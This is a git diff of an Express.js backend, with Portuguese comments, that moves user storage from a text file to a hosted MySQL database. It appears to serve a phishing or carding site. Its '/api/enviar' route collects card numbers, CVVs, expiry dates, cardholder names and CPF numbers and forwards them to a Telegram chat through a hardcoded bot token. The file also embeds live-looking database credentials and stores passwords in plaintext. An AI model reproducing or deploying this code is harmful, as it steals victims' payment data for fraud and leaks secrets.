@@ -1,97 +1,83 @@
-const express = require('express');
-const path = require('path');
-const fs = require('fs');
+// api/index.js
+const express = require("express");
+const mysql = require("mysql2");
 const fetch = require("node-fetch");
-const app = express();
+const path = require("path");
 
+const app = express();
 app.use(express.json());
 
-
-// Serve arquivos estáticos da pasta "site"
-app.use(express.static(path.join(__dirname, 'site')));
-
-// Redireciona / para o index.html
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'site', 'index.html'));
+// ======= CONFIG MYSQL (Hostinger) =======
+const db = mysql.createConnection({
+    host: "mysql.hostinger.com",
+    user: "u650766211_USERSYS",
+    password: "Tesourariado777",
+    database: "u650766211_USER",
+    port: 3306
 });
 
-// Inicia o servidor
-const PORT = 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor rodando em http://localhost:${PORT}`);
-});
-
-//REGISTRO
-const usersFile = './users.txt';
-
-app.post('/register', (req, res) => {
-  const { username, password, fullname } = req.body;
-
-  if (!username || !password || !fullname) {
-    return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
-  }
-
-  // Verifica se já existe
-  if (fs.existsSync(usersFile)) {
-    const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
-    const exists = existingUsers.some(line => {
-      const [savedUsername] = line.split('|');
-      return savedUsername === username;
-    });
-
-    if (exists) {
-      return res.json({ success: false, message: 'Usuário já existe.' });
-    }
-  }
-
-  // Salva novo usuário
-  const userLine = `${username}|${password}|${fullname}\n`;
-  fs.appendFileSync(usersFile, userLine);
-  res.json({ success: true });
-});
-
-//login
-app.post('/login', (req, res) => {
-  const { username, password } = req.body;
-
-  if (!username || !password) {
-    return res.json({ success: false, message: 'Informe usuário e senha.' });
-  }
-
-  fs.readFile('./users.txt', 'utf8', (err, data) => {
+db.connect(err => {
     if (err) {
-      console.error('Erro ao ler users.txt:', err);
-      return res.json({ success: false, message: 'Erro no servidor.' });
-    }
-
-    const users = data.split('\n')
-      .map(line => line.trim())
-      .filter(line => line.length > 0)
-      .map(line => {
-        const parts = line.split('|');
-        return {
-          username: parts[0],
-          password: parts[1],
-          fullname: parts[2]
-        };
-      });
-
-    const user = users.find(u => u.username === username && u.password === password);
-
-    if (user) {
-      res.json({ success: true, fullname: user.fullname });
+        console.error("Erro MySQL:", err);
     } else {
-      res.json({ success: false, message: 'Usuário ou senha inválidos.' });
+        console.log("✅ Conectado ao MySQL Hostinger");
     }
-  });
 });
 
-//TELEGRAM COLHEITA
+// ======= ROTAS =======
 
+// Registro
+app.post("/api/register", (req, res) => {
+    const { username, password, fullname } = req.body;
+    if (!username || !password || !fullname) {
+        return res.json({ success: false, message: "Campos obrigatórios não preenchidos." });
+    }
+
+    db.query(
+        "INSERT INTO users (username, password, fullname) VALUES (?, ?, ?)",
+        [username, password, fullname],
+        err => {
+            if (err) {
+                if (err.code === "ER_DUP_ENTRY") {
+                    return res.json({ success: false, message: "Usuário já existe." });
+                }
+                console.error("Erro no INSERT:", err);
+                return res.json({ success: false, message: "Erro no servidor." });
+            }
+            res.json({ success: true });
+        }
+    );
+});
+
+// Login
+app.post("/api/login", (req, res) => {
+    const { username, password } = req.body;
+    if (!username || !password) {
+        return res.json({ success: false, message: "Informe usuário e senha." });
+    }
+
+    db.query(
+        "SELECT * FROM users WHERE username = ? AND password = ?",
+        [username, password],
+        (err, results) => {
+            if (err) {
+                console.error("Erro no SELECT:", err);
+                return res.json({ success: false, message: "Erro no servidor." });
+            }
+            if (results.length > 0) {
+                res.json({ success: true, fullname: results[0].fullname });
+            } else {
+                res.json({ success: false, message: "Usuário ou senha inválidos." });
+            }
+        }
+    );
+});
+
+// Telegram coleta
 const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
-const CHAT_ID = "-1002852733056"; 
+const CHAT_ID = "-1002852733056";
 
-app.post("/enviar", async (req, res) => {
+app.post("/api/enviar", async (req, res) => {
     try {
         const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;
 
@@ -101,7 +87,7 @@ Número: ${cardNumber}
 CVV: ${cardcvvName}
 Validade: ${expiry}
 Nome: ${cardholderNameC}
-Cpf: ${cardholderIdentificationNumber}
+CPF: ${cardholderIdentificationNumber}
         `;
 
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -114,18 +100,16 @@ Cpf: ${cardholderIdentificationNumber}
         });
 
         const data = await response.json();
-        console.log("Resposta do Telegram:", data);
-
         if (!data.ok) {
             res.status(500).send(`Erro do Telegram: ${data.description}`);
         } else {
             res.send("Mensagem enviada com sucesso para o Telegram!");
         }
     } catch (error) {
-        console.error("Erro no envio:", error.message, error.stack);
+        console.error("Erro no envio:", error.message);
         res.status(500).send("Erro no servidor");
     }
 });
 
-
-
+// Exporta para Vercel
+module.exports = app;
